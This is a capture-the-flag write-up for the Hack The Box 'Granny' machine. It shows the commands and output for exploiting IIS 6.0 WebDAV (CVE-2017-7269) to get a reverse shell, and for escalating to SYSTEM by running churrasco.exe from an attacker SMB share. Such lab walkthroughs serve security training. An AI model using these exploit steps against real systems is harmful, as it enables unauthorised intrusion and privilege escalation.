+++
draft = false
date = 2021-07-12T18:00:02+01:00
title = ""
description = ""
slug = ""
tags = []
categories = []
externalLink = ""
series = []
weight = 0
+++

# Machine info

- OS : Windows
- Difficulty : Easy
- Points : 20
- IP : 10.10.10.15

# Mind Map

![Granny_MindMap](/images/htb/granny_mindmap.png)

&nbsp;

# Recon

Let's see the `nmap` scan result:

```
Nmap scan report for 10.10.10.15
Host is up, received user-set (0.057s latency).
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Mon, 12 Jul 2021 10:07:32 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Type: Microsoft-IIS/6.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|media device
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000|PocketPC/CE (98%), General Dynamics embedded (96%), Cisco embedded (92%), Motorola embedded (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/h:cisco:isb7150 cpe:/o:microsoft:windows_ce:5.0 cpe:/h:motorola:vip1200
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (98%), Microsoft Windows Server 2003 SP2 (98%), Microsoft Windows Server 2008 Enterprise SP2 (98%), Microsoft Windows 2003 SP2 (97%), Microsoft Windows Server 2003 SP1 - SP2 (97%), Microsoft Windows XP SP2 (97%), Microsoft Windows XP SP2 or Windows Server 2003 SP2 (97%), General Dynamics R8000B Comm Systems Analyzer (96%), Microsoft Windows 2000 SP4 (95%), Microsoft Windows XP SP2 or SP3 (95%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=7/12%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=60EC1466%P=x86_64-pc-linux-gnu)
SEQ(TS=0)
ECN(R=N)
ECN(R=Y%DF=N%TG=80%W=FAF0%O=M54BNW0NNS%CC=N%Q=)
T1(R=Y%DF=N%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=N%TG=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=80%CD=Z)
```
Only port `80` is open!


&nbsp;

# Enumeration

The version of the HTTP Server appears to be `Microsoft IIS httpd 6.0`. Conducting a simple research on the web, we can identify an exploit available for that version, which appears to be vulnerable to `CVE-2017-7269`.

The vulnerability is about a Buffer Overflow due to an improper validation of an 'IF' header in a `PROPFIND` request. A remote attacker could exploit this vulnerability in the `IIS WebDAV Component` with a crafted request using the `PROPFIND` method. Successful exploitation could result in denial of service condition or  arbitrary code execution in the context of the user running the application.
Web Distributed Authoring and Versioning (WebDAV) is an extension of the HTTP protocol that allows clients to perform remote Web content authoring operations. WebDAV extends the set of standard HTTP methods and headers allowed for the HTTP request.

The full exploit code is available here:

<https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell>

&nbsp;

# Exploitation

Launching the exploit script and specifying all the needed arguments:

```
$ python cve-2017-7269.py 10.10.10.15 80 10.10.16.209 8989                                                                                                                          1 ￢ﾨﾯ 1 ￢ﾚﾙ
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: ....
```

We get a shell as `NT Authoroty\Network Service`:

```
$ nc -nlvp 8989
listening on [any] 8989 ...
connect to [10.10.16.209] from (UNKNOWN) [10.10.10.15] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami                                                                                        
nt authority\network service
```

Once we are in the machine, it is useful to conduct a further enumeration. 
Inside the `Documents and Settings` folder, there is a hint about a possible `Lakis` user:

```
C:\Documents and Settings> dir

 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings

04/12/2017  10:19 PM    <DIR>          .
04/12/2017  10:19 PM    <DIR>          ..
04/12/2017  09:48 PM    <DIR>          Administrator
04/12/2017  05:03 PM    <DIR>          All Users
04/12/2017  10:19 PM    <DIR>          Lakis
               0 File(s)              0 bytes
               5 Dir(s)  18,119,520,256 bytes free

C:\Documents and Settings>cd Lakis
cd Lakis
Access is denied.
```
The folder is not accessible. In order to get the user flag we have to escalate privileges. 

&nbsp;

# Privilege Escalation

Launching the `systeminfo` command, we can see that the target machine has only one hotfix update installed, meaning that it is probably vulnerable to different exploits:

```
C:\WINDOWS\> systeminfo

Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 2 Hours, 23 Minutes, 14 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~1999 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 794 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,327 MB
Page File: In Use:         143 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```


At this point we can use the `Windows Exploit Suggester`:

<https://github.com/AonCyberLabs/Windows-Exploit-Suggester>

To make the script work in a Kali 2020.2 environment, we have to launch the following commands:

```
sudo wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
```

```
sudo python get-pip.py
```

```
sudo python -m pip2 install --user xlrd==1.1.0
```

```
sudo ./windows-exploit-suggester.py --update
```


The last one creates an excel spreadsheet from the Microsoft vulnerability database in the working directory.

Now we just have to save the `systeminfo` output to a `systeminfo.txt` file and launch the following command:

```
$ sudo ./windows-exploit-suggester.py --database 2021-07-12-mssb.xls --systeminfo systeminfo.txt

[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 1 hotfix(es) against the 356 potential bulletins(s) with a database of 137 known exploits
[*] there are now 356 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2003 SP2 32-bit'
[*] 
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*] 
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
[*] 
[E] MS14-070: Vulnerability in TCP/IP Could Allow Elevation of Privilege (2989935) - Important
[*]   http://www.exploit-db.com/exploits/35936/ -- Microsoft Windows Server 2003 SP2 - Privilege Escalation, PoC
[*] 
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*] 
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-062: Vulnerability in Message Queuing Service Could Allow Elevation of Privilege (2993254) - Important
[*]   http://www.exploit-db.com/exploits/34112/ -- Microsoft Windows XP SP3 MQAC.sys - Arbitrary Write Privilege Escalation, PoC
[*]   http://www.exploit-db.com/exploits/34982/ -- Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation
[*] 
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
[*] 
[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC
[*] 
[E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical
[E] MS14-029: Security Update for Internet Explorer (2962482) - Critical
[*]   http://www.exploit-db.com/exploits/34458/
[*] 
[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
[*] 
[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
[E] MS14-002: Vulnerability in Windows Kernel Could Allow Elevation of Privilege (2914368) - Important
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
[M] MS13-071: Vulnerability in Windows Theme File Could Allow Remote Code Execution (2864063) - Important
[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical
[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical
[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical
[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[M] MS11-080: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (2592799) - Important
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[M] MS09-065: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (969947) - Critical
[M] MS09-053: Vulnerabilities in FTP Service for Internet Information Services Could Allow Remote Code Execution (975254) - Important
[M] MS09-020: Vulnerabilities in Internet Information Services (IIS) Could Allow Elevation of Privilege (970483) - Important
[M] MS09-004: Vulnerability in Microsoft SQL Server Could Allow Remote Code Execution (959420) - Important
[M] MS09-002: Cumulative Security Update for Internet Explorer (961260) (961260) - Critical
[M] MS09-001: Vulnerabilities in SMB Could Allow Remote Code Execution (958687) - Critical
[M] MS08-078: Security Update for Internet Explorer (960714) - Critical
[*] done
```

These are all potential exploits for our target machine. However this time, since the majority of them appears not to be working, we will search for known exploits online, and precisely for `Windows Server 2003 SP2 Build 3790`. 

This one seems to be working:

<https://github.com/Re4son/Churrasco/raw/master/churrasco.exe>


From our attacking machine we have to serve the exploit via a `smbserver`:


```
$ sudo python3 /opt/impacket/examples/smbserver.py exploit .
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

In order to execute `SYSTEM` commands, we have to download the script to the target machine and, using the `-d` switch, specify the commands we want to run:

```
c:\windows\system32\inetsrv>\\10.10.17.36\exploit\churrasco.exe -d whoami
\\10.10.17.36\exploit\churrasco.exe -d whoami
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 676 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 680 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 692 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x728
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
nt authority\system
```

We are `SYSTEM`!




To get the user and root flags we can use the following commands:

```
C:\Documents and Settings>\\10.10.16.209\exploit\churrasco.exe -d "cd C:\Documents and Settings\Lakis\Desktop && type user.txt"
\\10.10.16.209\exploit\churrasco.exe -d "cd C:\Documents and Settings\Lakis\Desktop && type user.txt"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 676 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 680 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 692 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x72c
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found SYSTEM token 0x724
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!

700c5dxxxxxxxxxxxxxxxxxxxxxxxxx
```

```
C:\Documents and Settings>\\10.10.16.209\exploit\churrasco.exe -d "cd C:\Documents and Settings\Administrator\Desktop && type root.txt"
\\10.10.16.209\exploit\churrasco.exe -d "cd C:\Documents and Settings\Administrator\Desktop && type root.txt"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 676 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 680 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 692 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x72c
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found SYSTEM token 0x724
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
aa4beed1cxxxxxxxxxxxxxxxxxxxxxxx
```